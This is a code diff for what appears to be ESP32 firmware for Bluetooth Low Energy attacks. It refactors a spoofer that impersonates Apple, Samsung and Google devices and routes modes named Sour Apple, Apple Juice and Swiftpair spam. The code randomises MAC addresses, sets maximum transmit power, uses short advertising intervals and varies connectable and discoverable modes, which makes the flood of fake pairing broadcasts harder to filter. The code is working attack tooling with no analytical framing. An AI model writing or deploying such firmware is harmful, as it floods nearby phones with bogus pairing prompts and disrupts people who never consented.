@@ -17,7 +17,8 @@ LinkedList<BLEScanResult>* blescanres;
 bool bleScanRedraw = false;
 bool bleAnalyzerMode = false;
 uint8_t spooferDeviceIndex = -1;
-uint8_t spooferAdTypeIndex = -1;
+uint8_t spooferConnectableModeIndex = -1;
+uint8_t spooferDiscoverableModeIndex = -1;
 
 BLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
 {
@@ -200,11 +201,11 @@ void BLEModules::StartMode(BLEScanState mode) {
         bleAnalyzerMode = true;
         bleScan();
     } else if (mode == BLE_ATTACK_SPOOFER_APPLE)
-        startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_APPLE, spooferAdTypeIndex);
+        startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_APPLE, spooferConnectableModeIndex, spooferDiscoverableModeIndex);
     else if (mode == BLE_ATTACK_SPOOFER_SAMSUNG)
-        startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_SAMSUNG, spooferAdTypeIndex);
+        startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_SAMSUNG, spooferConnectableModeIndex, spooferDiscoverableModeIndex);
     else if (mode == BLE_ATTACK_SPOOFER_GOOGLE)
-        startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_GOOGLE, spooferAdTypeIndex);
+        startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_GOOGLE, spooferConnectableModeIndex, spooferDiscoverableModeIndex);
     else if (mode == BLE_ATTACK_EXPLOIT_SOUR_APPLE) 
         executeSwiftpair(SourApple);
     else if (mode == BLE_ATTACK_EXPLOIT_APPLE_JUICE) 
@@ -233,7 +234,7 @@ void BLEModules::StartMode(BLEScanState mode) {
     }
 }
 
-BLEAdvertisementData BLEModules::selectSpooferDevices(uint8_t device_type, uint8_t device_brand, uint8_t adv_type) {
+BLEAdvertisementData BLEModules::selectSpooferDevices(uint8_t device_type, uint8_t device_brand, uint8_t conn_mode, uint8_t disc_mode) {
     BLEAdvertisementData AdvData = BLEAdvertisementData();
     if (device_brand == BLE_SPOOFER_DEVICE_BRAND_APPLE) {
         Serial.println("[INFO] BLE Apple Spoofer Starting");
@@ -263,24 +264,40 @@ BLEAdvertisementData BLEModules::selectSpooferDevices(uint8_t device_type, uint8
     }
 
     Serial.println("[INFO] BLE Spoofer Device Index: " + (String)device_type);
-    String adv_type_str = "";
+    String conn_mode_str = "";
+    String disc_mode_str = "";
     
-    switch(adv_type) {
-        case ADV_MODE_NON:
+    switch(conn_mode) {
+        case CONN_MODE_NON:
             pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
-            adv_type_str = "NONN";
+            conn_mode_str = "NON";
             break;
-        case ADV_MODE_DIR:
+        case CONN_MODE_DIR:
             pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_DIR);
-            adv_type_str = "DIR";
+            conn_mode_str = "DIR";
             break;
-        case ADV_MODE_UND:
+        case CONN_MODE_UND:
             pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_UND);
-            adv_type_str = "UND";
+            conn_mode_str = "UND";
+            break;
+    }
+    switch(disc_mode) {
+        case DISC_MODE_NON:
+            pAdvertising->setDiscoverableMode(BLE_GAP_DISC_MODE_NON);
+            disc_mode_str = "NON";
+            break;
+        case DISC_MODE_LTD:
+            pAdvertising->setDiscoverableMode(BLE_GAP_DISC_MODE_LTD);
+            disc_mode_str = "LTD";
+            break;
+        case DISC_MODE_GEN:
+            pAdvertising->setDiscoverableMode(BLE_GAP_DISC_MODE_GEN);
+            disc_mode_str = "GEN";
             break;
     }
 
-    Serial.println("[INFO] BLE Spoofer Ad Type: " + adv_type_str);
+    Serial.println("[INFO] BLE Spoofer Connectable Mode: " + conn_mode_str);
+    Serial.println("[INFO] BLE Spoofer Discoverable Mode: " + disc_mode_str);
 
     return AdvData;
 }
@@ -290,14 +307,14 @@ void BLEModules::initSpoofer() {
         Serial.println("[INFO] BLE already initialized, skipping...");
         return;
     }
-    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
+    uint8_t null_addr[6] = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
     esp_ble_gap_set_rand_addr(null_addr);
 
     Serial.println("[INFO] BLE Spoofer Initialized Successfully!");
 }
 
-void BLEModules::startSpoofer(uint8_t device_type, uint8_t device_brand, uint8_t adv_type) {
-    esp_bd_addr_t dummy_addr = {0x00};
+void BLEModules::startSpoofer(uint8_t device_type, uint8_t device_brand, uint8_t conn_mode, uint8_t disc_mode) {
+    uint8_t dummy_addr[6] = {0x00};
       for (int i = 0; i < 6; i++) {
         dummy_addr[i] = random(256);
         if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
@@ -306,14 +323,14 @@ void BLEModules::startSpoofer(uint8_t device_type, uint8_t device_brand, uint8_t
         uint8_t macAddr[6];
         generateRandomMac(macAddr);
         esp_base_mac_addr_set(macAddr);
-        esp_ble_gap_set_rand_addr(dummy_addr);
+        esp_ble_gap_set_rand_addr((uint8_t*)dummy_addr);
         NimBLEDevice::init(espatsettings.bleName.c_str());
         NimBLEDevice::setPower(MAX_TX_POWER);
         NimBLEServer *pServer = BLEDevice::createServer();
         pAdvertising = pServer->getAdvertising();
         ble_initialized = true;
     }
-    NimBLEAdvertisementData oAdvertisementData = selectSpooferDevices(device_type, device_brand, adv_type);
+    NimBLEAdvertisementData oAdvertisementData = selectSpooferDevices(device_type, device_brand, conn_mode, disc_mode);
     pAdvertising->addServiceUUID(SERVICE_UUID);
     pAdvertising->setAdvertisementData(oAdvertisementData);
     pAdvertising->setMinInterval(0x20); // 32.5ms
@@ -335,7 +352,7 @@ void BLEModules::stopSpoofer() {
 }
 
 void BLEModules::initSpam() {
-    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
+    uint8_t null_addr[6] = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
     esp_ble_gap_set_rand_addr(null_addr);
 
     ble_initialized = true;
@@ -347,7 +364,7 @@ void BLEModules::executeSwiftpair(EBLEPayloadType type, bool forspamall)
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
     esp_base_mac_addr_set(macAddr);
-    esp_bd_addr_t dummy_addr = {0x00};
+    uint8_t dummy_addr[6] = {0x00};
       for (int i = 0; i < 6; i++) {
         dummy_addr[i] = random(256);
         if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
@@ -361,6 +378,9 @@ void BLEModules::executeSwiftpair(EBLEPayloadType type, bool forspamall)
     NimBLEAdvertisementData advertisementData = GetAdvertismentData(type);
     pAdvertising->addServiceUUID(SERVICE_UUID);
     pAdvertising->setAdvertisementData(advertisementData);
+    if (random(2) == 0) pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
+    else pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_UND);
+    pAdvertising->setDiscoverableMode(random(3));
     pAdvertising->setMinInterval(0x20);
     pAdvertising->setMaxInterval(0x20);
     pAdvertising->setPreferredParams(0x20, 0x20);
